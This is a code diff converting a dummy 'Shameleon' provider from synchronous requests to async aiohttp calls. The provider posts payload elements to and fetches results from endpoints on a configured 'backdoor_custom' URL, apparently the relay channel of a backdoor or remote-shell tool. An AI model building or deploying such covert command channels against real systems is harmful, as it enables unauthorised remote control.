@@ -1,4 +1,4 @@
-import requests
+import aiohttp
 
 from shameleon_client.providers.base import ShameleonProvider
 
@@ -13,22 +13,23 @@ class DummyShameleonProvider(ShameleonProvider):
     This provider is not intended to be used in production.
     """
 
-    def _send_payload(self, payload: list[str]):
-        req = requests.post(
-            f"{self._profile.backdoor_custom['url']}/in",
-            json={'elements': payload},
-            timeout=self._profile.http_timeout,
-        )
-        req.raise_for_status()
+    async def _send_payload(self, payload: list[str]):
+        async with aiohttp.ClientSession(raise_for_status=True) as session:
+            await session.post(
+                f"{self._profile.backdoor_custom['url']}/in",
+                json={'elements': payload},
+                timeout=self._profile.http_timeout,
+            )
 
-    def _get_payload(self) -> list[tuple[str, str]]:
+    async def _get_payload(self) -> list[tuple[str, str]]:
         output: list[tuple[str, str]] = []
-        req = requests.get(
-            f"{self._profile.backdoor_custom['url']}/out",
-            timeout=self._profile.http_timeout,
-        )
-        req.raise_for_status()
-        results = req.json()['elements']
+        async with aiohttp.ClientSession(raise_for_status=True) as session:
+            async with session.get(
+                f"{self._profile.backdoor_custom['url']}/out",
+                timeout=self._profile.http_timeout,
+            ) as req:
+                data = await req.json()
+                results = data['elements']
         if len(results) > 0:
             for result in results:
                 result = result.strip()
